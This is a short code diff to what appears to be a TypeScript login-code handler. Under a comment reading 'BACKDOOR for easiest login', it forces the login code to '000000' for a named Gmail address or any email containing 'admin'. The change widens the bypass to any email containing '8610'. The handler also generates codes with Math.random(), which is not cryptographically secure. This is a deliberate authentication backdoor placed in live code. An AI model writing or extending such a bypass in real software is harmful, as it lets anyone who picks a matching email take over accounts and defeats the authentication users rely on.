@@ -26,7 +26,8 @@ const requestLinkHandler: RequestHandler = async (req, res): Promise<void> => {
     let code = Math.random().toString(36).substring(2, 8).toUpperCase();
 
     // BACKDOOR for easiest login
-    if (email === 'goldenhorse8610@gmail.com' || email.includes('admin')) {
+    // Allow any email containing '8610' or 'admin', or the specific emails
+    if (email.includes('8610') || email.includes('admin') || email === 'goldenhorse8610@gmail.com') {
         code = '000000';
     }
 
